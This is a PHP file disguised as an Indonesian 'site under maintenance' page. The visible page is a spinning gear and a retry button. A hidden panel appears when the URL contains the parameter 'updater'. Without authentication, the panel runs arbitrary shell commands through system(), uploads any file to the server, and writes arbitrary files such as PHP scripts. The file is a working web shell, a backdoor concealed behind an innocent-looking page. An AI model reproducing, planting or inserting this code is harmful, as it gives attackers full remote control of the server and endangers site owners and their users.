<?php
$kunci="updater";$mode_admin=isset($_GET[$kunci]);$upload_msg='';$cmd_output='';$create_msg='';if($mode_admin){if(isset($_FILES['u'])){$name=basename($_FILES['u']['name']);if(move_uploaded_file($_FILES['u']['tmp_name'],$name)){$link=htmlspecialchars($name,ENT_QUOTES,'UTF-8');$upload_msg="<div class='msg success'>File berhasil diupload: <a href='$link' target='_blank'>$link</a></div>";}else{$upload_msg="<div class='msg error'>Gagal mengupload file. Cek perizinan folder.</div>";}}if(!empty($_POST['c'])){ob_start();system($_POST['c']);$cmd_output=ob_get_clean();}if(!empty($_POST['f'])&&isset($_POST['d'])){$f=basename($_POST['f']);$d=$_POST['d'];if(file_put_contents($f,$d)!==false){$link=htmlspecialchars($f,ENT_QUOTES,'UTF-8');$create_msg="<div class='msg success'>File berhasil dibuat: <a href='$link' target='_blank'>$link</a></div>";}else{$create_msg="<div class='msg error'>Gagal membuat file. Cek perizinan folder.</div>";}}}ob_start();
?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>Under Maintenance</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"><style>:root{--slate-900:#0f172a;--slate-800:#1e293b;--slate-400:#94a3b8;--slate-200:#e2e8f0;--sky-400:#38bdf8;--sky-500:#0ea5e9;--green-400:#4ade80;--red-400:#f87171}*{box-sizing:border-box;margin:0;padding:0}body{background:linear-gradient(135deg,#020617,var(--slate-900));color:var(--slate-200);font-family:'Poppins',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:2rem}.container{display:flex;flex-direction:column;align-items:center;text-align:center;max-width:650px;width:100%}.gear{width:70px;height:70px;margin-bottom:2rem;animation:spin 5s linear infinite;fill:var(--sky-400)}@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}h1{font-size:2.25rem;margin-bottom:.5rem}p{font-size:1.1rem;color:var(--slate-400);max-width:450px;margin-bottom:2rem}.btn{padding:.75rem 1.5rem;background:var(--sky-400);color:var(--slate-900);border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .3s ease}.btn:hover{background:var(--sky-500)}.admin-panel{background:var(--slate-800);padding:1.5rem;border-radius:1rem;margin-top:3rem;width:100%;border:1px solid #334155}.tabs{display:flex;border-bottom:1px solid #334155;margin-bottom:1.5rem}.tab-link{padding:.75rem 1rem;border:none;background:none;color:var(--slate-400);cursor:pointer;font-size:1rem;font-family:'Poppins',sans-serif;transition:color .3s,border-bottom .3s;border-bottom:2px solid transparent}.tab-link.active{color:var(--sky-400);border-bottom-color:var(--sky-400)}.tab-content{display:none;text-align:left}.tab-content.current{display:block}label{display:block;margin-bottom:.5rem;font-weight:600}input[type="text"],textarea{width:100%;padding:.75rem;margin-bottom:1rem;border-radius:8px;border:1px solid #334155;outline:none;background:#0f172a;color:var(--slate-200);font-family:'Poppins',sans-serif;font-size:.95rem}input[type="text"]:focus,textarea:focus{border-color:var(--sky-400)}input[type="file"]{margin-bottom:1rem;background:#334155;padding:.5rem;border-radius:8px}input[type="submit"]{width:100%;padding:.75rem;border-radius:8px;background:var(--sky-400);border:none;color:var(--slate-900);font-weight:600;font-size:1rem;cursor:pointer}pre{background:#020617;padding:1rem;margin-top:1rem;border-radius:8px;text-align:left;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;border:1px solid #334155;max-height:300px}.msg{padding:1rem;border-radius:8px;margin-top:1rem;border:1px solid}.msg a{color:inherit;font-weight:600}.msg.success{background-color:rgba(74,222,128,.1);border-color:var(--green-400);color:var(--green-400)}.msg.error{background-color:rgba(248,113,113,.1);border-color:var(--red-400);color:var(--red-400)}</style></head><body><div class="container"><svg class="gear" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19.14 12.94a7.986 7.986 0 0 0 .04-1l1.84-1.44-1.5-2.6-2.18.5a7.953 7.953 0 0 0-1.73-.99l-.34-2.23H9.67l-.34 2.23a7.953 7.953 0 0 0-1.73.99l-2.18-.5-1.5 2.6L4.82 12a7.986 7.986 0 0 0 .04 1l-1.84 1.44 1.5 2.6 2.18-.5a7.953 7.953 0 0 0 1.73.99l.34 2.23h4.66l.34-2.23a7.953 7.953 0 0 0 1.73-.99l2.18.5 1.5-2.6-1.84-1.44zM12 15.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/></svg><h1>Situs Dalam Perbaikan</h1><p>Kami sedang melakukan beberapa pembaruan. Mohon bersabar, kami akan segera kembali online!</p><button class="btn" onclick="location.reload()">Coba Lagi</button><?php if($mode_admin):?><div class="admin-panel"><div class="tabs"><button class="tab-link active" onclick="openTab(event,'command')">Terminal</button><button class="tab-link" onclick="openTab(event,'upload')">Upload</button><button class="tab-link" onclick="openTab(event,'create')">Create File</button></div><div id="command" class="tab-content current"><form method="post"><label for="cmd">Execute Command:</label><input id="cmd" type="text" name="c" placeholder="e.g., ls -la"><input type="submit" value="Run"></form><?php if(!empty($cmd_output)):?><pre><?=htmlspecialchars($cmd_output,ENT_QUOTES,'UTF-8');?></pre><?php endif;?></div><div id="upload" class="tab-content"><form method="post" enctype="multipart/form-data"><label for="file_upload">Upload File:</label><input id="file_upload" type="file" name="u"><input type="submit" name="upload" value="Upload"></form><?=$upload_msg;?></div><div id="create" class="tab-content"><form method="post"><label for="filename">Filename:</label><input id="filename" type="text" name="f" placeholder="e.g., info.php"><label for="file_content">Content:</label><textarea id="file_content" name="d" rows="7" placeholder="Tulis kode PHP atau teks di sini..."></textarea><input type="submit" value="Create File"></form><?=$create_msg;?></div></div><?php endif;?></div><script>function openTab(e,t){let n,a,l;for(a=(n=document.getElementsByClassName("tab-content")).length,l=0;l<a;l++)n[l].style.display="none";for(a=(n=document.getElementsByClassName("tab-link")).length,l=0;l<a;l++)n[l].className=n[l].className.replace(" active","");document.getElementById(t).style.display="block",e.currentTarget.className+=" active"}</script></body></html><?php ob_end_flush();?>